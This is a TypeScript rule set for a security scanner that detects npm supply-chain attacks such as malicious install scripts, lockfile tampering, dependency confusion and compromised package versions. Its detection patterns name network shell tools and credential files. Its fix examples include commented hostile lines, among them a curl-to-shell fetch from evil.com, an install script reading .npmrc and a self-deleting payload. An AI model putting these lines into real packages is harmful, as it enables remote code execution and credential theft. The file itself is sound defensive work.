import type { SecurityRule } from "./types.js";

// Supply chain and package security rules
export const supplyChainRules: SecurityRule[] = [
  {
    id: "VG860",
    name: "Malicious postinstall Script",
    severity: "critical",
    owasp: "A03:2025 Software Supply Chain Failures",
    description:
      "postinstall or preinstall script contains network requests, eval, or exec. This is the #1 npm supply chain attack vector.",
    pattern:
      /["'](?:post|pre)install["']\s*:\s*["'][^"']*(?:curl|wget|http|https|eval|exec|node\s+-e|sh\s+-c|bash\s+-c)/gi,
    languages: ["json"],
    fix: "Review postinstall scripts carefully. Remove or replace packages with suspicious install scripts.",
    fixCode:
      '// Safe: no network/exec in install scripts\n"scripts": {\n  "postinstall": "prisma generate"\n}\n\n// DANGEROUS: network calls in install\n// "postinstall": "node -e \\"require(\'https\').get(...)\\""',
    compliance: ["SOC2:CC7.1"],
  },
  {
    id: "VG861",
    name: "GitHub Actions persist-credentials Not Disabled",
    severity: "medium",
    owasp: "A01:2025 Broken Access Control",
    description:
      "actions/checkout with persist-credentials enabled (default: true) leaves Git credentials on the runner. Third-party actions in later steps can push to your repository.",
    pattern:
      /uses:\s*actions\/checkout@[\s\S]{0,200}?uses:\s*(?!actions\/)[^\s]+@/g,
    languages: ["yaml"],
    fix: "Add persist-credentials: false to actions/checkout when using third-party actions.",
    fixCode:
      "- uses: actions/checkout@v4\n  with:\n    persist-credentials: false",
    compliance: ["SOC2:CC6.1"],
  },
  {
    id: "VG862",
    name: "Source Map Publish Risk",
    severity: "critical",
    owasp: "A05:2021 Security Misconfiguration",
    description:
      'Source map files (.map) expose original source code when published to npm. Anthropic\'s Claude Code source leak (March 2026) was caused by this exact misconfiguration. If tsconfig enables sourceMap and the package lacks .npmignore exclusions, your entire codebase ships to the registry.',
    pattern: /"sourceMap"\s*:\s*true/g,
    languages: ["json"],
    fix: 'Set "sourceMap": false in tsconfig.json for production builds, or add *.map to .npmignore to prevent source maps from being published.',
    fixCode:
      '// tsconfig.json — disable source maps for published packages\n{\n  "compilerOptions": {\n    "sourceMap": false,\n    "declarationMap": false\n  }\n}\n\n// Or add to .npmignore:\n// *.map',
    compliance: ["SOC2:CC6.1", "PCI-DSS:Req6.5.10"],
  },
  {
    id: "VG863",
    name: 'package.json Missing "files" Field',
    severity: "high",
    owasp: "A05:2021 Security Misconfiguration",
    description:
      'A publishable npm package without a "files" field in package.json publishes the entire project directory — including src/, .env, test fixtures, and internal configs. Always use "files" to whitelist only build output.',
    pattern: /"version"\s*:\s*"[^"]*"(?![\s\S]*"files"\s*:)(?![\s\S]*"private"\s*:\s*true)/g,
    languages: ["json"],
    fix: 'Add a "files" field to package.json listing only the directories and files needed by consumers (e.g., dist/, build/).',
    fixCode:
      '// package.json — whitelist published files\n{\n  "name": "my-package",\n  "version": "1.0.0",\n  "files": [\n    "dist",\n    "build",\n    "README.md"\n  ]\n}',
    compliance: ["SOC2:CC6.1"],
  },
  {
    id: "VG864",
    name: '"files" Field Includes Source Code',
    severity: "high",
    owasp: "A05:2021 Security Misconfiguration",
    description:
      'The "files" field in package.json includes source directories ("src", ".", or "**"). This publishes raw source code to npm, defeating the purpose of the whitelist. Only compiled output should be listed.',
    pattern: /"files"\s*:\s*\[[^\]]*(?:"src"|"\.\/?"|"\*\*")[^\]]*\]/g,
    languages: ["json"],
    fix: 'Remove "src", ".", and "**" from the "files" array. Only include compiled output directories like "dist" or "build".',
    fixCode:
      '// BAD — leaks source code\n// "files": ["src", "dist"]\n\n// GOOD — only build output\n{\n  "files": [\n    "dist",\n    "build"\n  ]\n}',
    compliance: ["SOC2:CC6.1", "PCI-DSS:Req6.5.10"],
  },
  {
    id: "VG865",
    name: ".npmignore Missing Sensitive File Patterns",
    severity: "medium",
    owasp: "A05:2021 Security Misconfiguration",
    description:
      ".npmignore exists but does not exclude common sensitive files (*.map, .env, src/). Without these exclusions, source maps, environment secrets, and raw source code can leak into the published package.",
    pattern: /^(?![\s\S]*\*\.map)(?![\s\S]*\.env)(?![\s\S]*src\/).+/gm,
    languages: ["shell"],
    fix: "Add *.map, .env*, src/, and tests/ to .npmignore to prevent accidental publish of sensitive files.",
    fixCode:
      "# .npmignore — exclude sensitive files from npm publish\n*.map\n.env\n.env.*\nsrc/\ntests/\n__tests__/\n*.test.*\n*.spec.*\ntsconfig*.json\n.github/",
    compliance: ["SOC2:CC6.1"],
  },
  {
    id: "VG866",
    name: "Invisible Unicode Characters in Source Code",
    severity: "critical",
    owasp: "A02:2025 Injection",
    description:
      "Source code contains invisible Unicode characters (zero-width spaces, variation selectors, PUA codepoints). The GlassWorm attack (2025-2026) used these to encode malicious payloads that are invisible in every code editor, compromising 433+ repositories across GitHub, npm, and VSCode.",
    pattern: /[\u200B\u200C\u200D\uFEFF\u2060\u2061\u2062\u2063\u2064]{2,}/g,
    languages: ["javascript", "typescript", "python", "go"],
    fix: "Remove all invisible Unicode characters from source code. Use a linter rule to prevent them.",
    fixCode:
      '// Detect invisible characters with a pre-commit hook:\n// grep -rP "[\\x{200B}\\x{200C}\\x{200D}\\x{FEFF}\\x{00AD}\\x{FE00}-\\x{FE0F}]" src/\n\n// Or add an ESLint rule:\n// "no-irregular-whitespace": "error"',
    compliance: ["SOC2:CC7.1"],
  },
  {
    id: "VG867",
    name: "Obfuscated Payload in Install Script",
    severity: "critical",
    owasp: "A03:2025 Software Supply Chain Failures",
    description:
      "Install script contains Base64 decoding, hex escape sequences, or Buffer.from() — common obfuscation techniques used in npm supply chain attacks (Shai-Hulud, SANDWORM_MODE). Legitimate packages rarely need encoded payloads in lifecycle scripts.",
    pattern: /["'](?:post|pre)install["']\s*:\s*["'][^"']*(?:Buffer\.from|atob|btoa|\\x[0-9a-f]{2}|fromCharCode|String\.raw|decode\s*\()/gi,
    languages: ["json"],
    fix: "Remove obfuscated code from install scripts. Legitimate postinstall scripts should only run build tools like prisma generate or patch-package.",
    fixCode:
      '// Safe install scripts:\n"scripts": {\n  "postinstall": "prisma generate"\n}\n\n// DANGEROUS — obfuscated payload:\n// "postinstall": "node -e \\"Buffer.from(\'...payload...\', \'base64\').toString()\\"',
    compliance: ["SOC2:CC7.1"],
  },
  {
    id: "VG868",
    name: "Install Script Accesses Credential Files",
    severity: "critical",
    owasp: "A01:2025 Broken Access Control",
    description:
      "Package install script reads credential files (.npmrc, .ssh, .aws, .env, .git-credentials). The SANDWORM_MODE worm (2026) and Shai-Hulud variants use this technique to steal developer tokens and propagate to other packages.",
    pattern: /["'](?:post|pre)install["']\s*:\s*["'][^"']*(?:\.npmrc|\.ssh|\.aws|credentials|\.env|\.git-credentials|\.netrc|\.docker\/config)/gi,
    languages: ["json"],
    fix: "Remove credential file access from install scripts. No legitimate package needs to read your SSH keys or npm tokens during installation.",
    fixCode:
      '// DANGEROUS:\n// "postinstall": "node -e \\"fs.readFileSync(process.env.HOME+\'/.npmrc\')\\"\n\n// Safe: no credential access\n"scripts": {\n  "postinstall": "prisma generate"\n}',
    compliance: ["SOC2:CC6.1"],
  },
  {
    id: "VG869",
    name: "Self-Deleting Payload in Package Script",
    severity: "high",
    owasp: "A03:2025 Software Supply Chain Failures",
    description:
      "Package script deletes its own files after execution (fs.unlinkSync, rm -f on script files). This is a forensic evasion technique used by advanced supply chain malware — the payload runs, then erases evidence of its existence.",
    pattern: /["'](?:post|pre)install["']\s*:\s*["'][^"']*(?:unlinkSync|rm\s+-[rf]+\s+.*(?:setup|install|hook)|rimraf\s+.*(?:setup|install|hook))/gi,
    languages: ["json"],
    fix: "Investigate packages with self-deleting install scripts. This is a strong indicator of malicious intent.",
    fixCode:
      '// DANGEROUS — self-deleting payload:\n// "postinstall": "node setup.js && rm -f setup.js"\n\n// Legitimate scripts don\'t delete themselves:\n"scripts": {\n  "postinstall": "patch-package"\n}',
    compliance: ["SOC2:CC7.1"],
  },
  {
    id: "VG870",
    name: "Lockfile Missing Integrity Hash",
    severity: "critical",
    owasp: "A03:2025 Software Supply Chain Failures",
    description:
      "A package in the lockfile (package-lock.json) is missing an integrity hash. Integrity hashes (sha512/sha256) ensure that the downloaded package matches what was originally resolved. Missing hashes indicate possible lockfile tampering — the exact technique used in the Axios supply chain attack (March 2026) where a malicious dependency was injected without proper integrity verification.",
    pattern:
      /"node_modules\/[^"]+"\s*:\s*\{[^}]*"resolved"\s*:\s*"[^"]*"(?![^}]*"integrity")[^}]*\}/g,
    languages: ["json"],
    fix: "Run `npm install` with a clean node_modules to regenerate integrity hashes. If hashes were manually removed, investigate for lockfile tampering.",
    fixCode:
      '// Healthy lockfile entry has integrity hash:\n"node_modules/axios": {\n  "version": "1.7.9",\n  "resolved": "https://registry.npmjs.org/axios/-/axios-1.7.9.tgz",\n  "integrity": "sha512-LhHLbBcJkvZz..."\n}\n\n// DANGEROUS — missing integrity:\n// "node_modules/axios": {\n//   "version": "1.14.1",\n//   "resolved": "https://registry.npmjs.org/axios/-/axios-1.14.1.tgz"\n// }',
    compliance: ["SOC2:CC7.1", "PCI-DSS:Req6.5.10"],
  },
  {
    id: "VG871",
    name: "Non-Registry Tarball URL in Lockfile",
    severity: "critical",
    owasp: "A03:2025 Software Supply Chain Failures",
    description:
      'Lockfile contains a "resolved" URL pointing to a non-official npm registry. Legitimate packages resolve to registry.npmjs.org. Third-party or attacker-controlled registries can serve tampered packages. This is a key indicator of dependency substitution attacks.',
    pattern:
      /"resolved"\s*:\s*"https?:\/\/(?!registry\.npmjs\.org\/)[^"]*\.tgz"/g,
    languages: ["json"],
    fix: "Verify the package source. If using a private registry, ensure it is your organization's approved registry. Remove any packages resolving to unknown hosts.",
    fixCode:
      '// Safe — official npm registry:\n"resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz"\n\n// DANGEROUS — unknown registry:\n// "resolved": "https://evil-registry.com/lodash/-/lodash-4.17.21.tgz"',
    compliance: ["SOC2:CC7.1", "PCI-DSS:Req6.5.10"],
  },
  {
    id: "VG872",
    name: "Dependency Confusion Risk — Unscoped Internal Package Name",
    severity: "high",
    owasp: "A03:2025 Software Supply Chain Failures",
    description:
      'Package dependency uses common internal naming patterns (e.g., prefixed with "internal-", "company-", "app-") without an npm scope (@org/). Unscoped packages with internal-sounding names are prime targets for dependency confusion attacks — an attacker publishes a higher-versioned package with the same name on the public registry.',
    pattern:
      /"(?:internal-|company-|corp-|private-|infra-|platform-|service-|lib-|shared-|common-|core-|base-|app-|org-|team-|dept-)[a-z0-9-]+":\s*"[\^~]?\d/g,
    languages: ["json"],
    fix: "Use npm scopes (@your-org/package-name) for all internal packages. Configure .npmrc to route your scope to your private registry.",
    fixCode:
      '// DANGEROUS — unscoped internal package (dependency confusion target):\n"dependencies": {\n  "internal-auth": "^2.1.0"\n}\n\n// Safe — scoped to your org:\n"dependencies": {\n  "@mycompany/internal-auth": "^2.1.0"\n}',
    compliance: ["SOC2:CC7.1"],
  },
  {
    id: "VG873",
    name: "Suspicious Package Name — Deceptive Prefix/Suffix Pattern",
    severity: "high",
    owasp: "A03:2025 Software Supply Chain Failures",
    description:
      'Dependency uses a deceptive naming pattern that mimics a legitimate package with a prefix or suffix (e.g., "plain-crypto-js" mimicking "crypto-js", "real-lodash" mimicking "lodash"). This is the exact technique used in the Axios NPM supply chain attack (March 2026) where the injected "plain-crypto-js" package was a backdoor disguised as a crypto utility.',
    pattern:
      /"(?:plain-|real-|original-|safe-|secure-|true-|actual-|verified-|legit-|official-|clean-|pure-|native-|simple-|fast-|super-|ultra-|better-|enhanced-|improved-|modern-|updated-)[a-z][\w.-]*":\s*"[\^~]?\d/g,
    languages: ["json"],
    fix: "Verify the package is legitimate. Check npm for the package author, publication date, and download count. Compare with the well-known package it appears to mimic.",
    fixCode:
      '// DANGEROUS — deceptive prefix mimicking crypto-js:\n"dependencies": {\n  "plain-crypto-js": "^1.0.0"\n}\n\n// Safe — use the real package:\n"dependencies": {\n  "crypto-js": "^4.2.0"\n}',
    compliance: ["SOC2:CC7.1"],
  },
  {
    id: "VG874",
    name: "Install Script Downloads and Executes Remote Code",
    severity: "critical",
    owasp: "A03:2025 Software Supply Chain Failures",
    description:
      "Install script combines download and execution in a single command (e.g., curl|sh, wget|bash, fetch+eval). This is the most dangerous pattern in supply chain attacks — it downloads arbitrary code and immediately executes it with the developer's full permissions.",
    pattern:
      /["'](?:post|pre)install["']\s*:\s*["'][^"']*(?:curl[^"']*\|\s*(?:sh|bash|node)|wget[^"']*\|\s*(?:sh|bash|node)|fetch\([^)]*\)[^"']*\.then[^"']*eval|npx\s+[^@\s][^"']*)/gi,
    languages: ["json"],
    fix: "Never pipe remote content directly to a shell. Download files first, verify checksums, then execute.",
    fixCode:
      '// DANGEROUS — download and execute:\n// "postinstall": "curl https://evil.com/setup.sh | sh"\n\n// Safe — no remote execution in install scripts:\n"scripts": {\n  "postinstall": "prisma generate"\n}',
    compliance: ["SOC2:CC7.1", "PCI-DSS:Req6.5.10"],
  },
  {
    id: "VG875",
    name: "Lockfile Contains Deprecated SHA-1 Integrity",
    severity: "medium",
    owasp: "A03:2025 Software Supply Chain Failures",
    description:
      "Lockfile uses SHA-1 integrity hashes instead of SHA-512. SHA-1 is cryptographically broken — collision attacks are practical. An attacker who can produce a SHA-1 collision could substitute a malicious package that passes integrity verification. Modern lockfiles should exclusively use SHA-512.",
    pattern: /"integrity"\s*:\s*"sha1-[A-Za-z0-9+/=]+"/g,
    languages: ["json"],
    fix: "Delete node_modules and package-lock.json, then run `npm install` to regenerate with SHA-512 hashes. Ensure you are using npm >= 7.",
    fixCode:
      '// WEAK — SHA-1 integrity (broken algorithm):\n"integrity": "sha1-abc123def456..."\n\n// Strong — SHA-512 integrity:\n"integrity": "sha512-abc123def456ghij..."',
    compliance: ["SOC2:CC7.1", "PCI-DSS:Req6.5.10"],
  },
  {
    id: "VG1056",
    name: "@tanstack/* Compromised Versions May 2026 (CVE-2026-45321) — Credential Exfiltration",
    severity: "critical",
    owasp: "A03:2025 Software Supply Chain Failures",
    description:
      "On 2026-05-11 between 19:20 and 19:26 UTC, an attacker chained a pull_request_target Pwn Request misconfiguration, GitHub Actions cache poisoning across the fork↔base boundary, and runtime extraction of the OIDC trusted-publisher token to publish 84 malicious versions across 42 @tanstack/* packages to npm. Each affected package received exactly two malicious versions. Installing any of them executes a ~2.3 MB obfuscated router_init.js at install time that harvests AWS/GCP/Kubernetes/Vault credentials, npm/GitHub/SSH tokens, and exfiltrates them over the Session/Oxen messenger network (filev2.getsession.org). Pin to a clean release and rotate every credential the affected host could reach.",
    pattern:
      /["']@tanstack\/(?:arktype-adapter|eslint-plugin-router|eslint-plugin-start|history|nitro-v2-vite-plugin|react-router|react-router-devtools|react-router-ssr-query|react-start|react-start-client|react-start-rsc|react-start-server|router-cli|router-core|router-devtools|router-devtools-core|router-generator|router-plugin|router-ssr-query-core|router-utils|router-vite-plugin|solid-router|solid-router-devtools|solid-router-ssr-query|solid-start|solid-start-client|solid-start-server|start-client-core|start-fn-stubs|start-plugin-core|start-server-core|start-static-server-functions|start-storage-context|valibot-adapter|virtual-file-routes|vue-router|vue-router-devtools|vue-router-ssr-query|vue-start|vue-start-client|vue-start-server|zod-adapter)["']\s*:\s*["'](?:\^|~|>=?|=)?\s*(?:0\.0\.(?:4|7|47|50)|1\.154\.(?:12|15)|1\.161\.(?:9|10|11|12|13|14)|1\.166\.(?:12|15|16|18|19|38|41|44|45|46|47|48|49|50|51|53|54|55|56|57|58)|1\.167\.(?:6|9|33|36|38|41|61|64|65|68|71)|1\.168\.(?:3|5|6|8)|1\.169\.(?:5|8|23|26))["']/g,
    languages: ["json"],
    fix: "Pin every affected @tanstack/* package to a clean version published after 2026-05-11 (npm install @tanstack/react-router@latest etc., or use overrides for transitive copies). Then rotate everything the install host could reach: AWS access keys, GCP service-account keys, Kubernetes tokens, Vault tokens, ~/.npmrc tokens, GitHub PATs and gh CLI auth, .git-credentials, and any SSH private key in ~/.ssh. Wipe and reissue the CI runner if the install ran in CI.",
    fixCode:
      '// package.json — pin to clean versions\n"@tanstack/react-router": "^1.169.9",  // or latest non-malicious\n"@tanstack/router-core": "^1.169.9",\n"@tanstack/react-start": "^1.167.72"\n\n// pnpm / yarn / npm overrides to evict transitive copies\n"overrides": {\n  "@tanstack/react-router": "^1.169.9",\n  "@tanstack/router-core": "^1.169.9"\n}\n\n// Network mitigation while rotating: block *.getsession.org egress',
    compliance: ["SOC2:CC6.1", "SOC2:CC7.1", "PCI-DSS:Req6.2", "PCI-DSS:Req3.5"],
  },
];
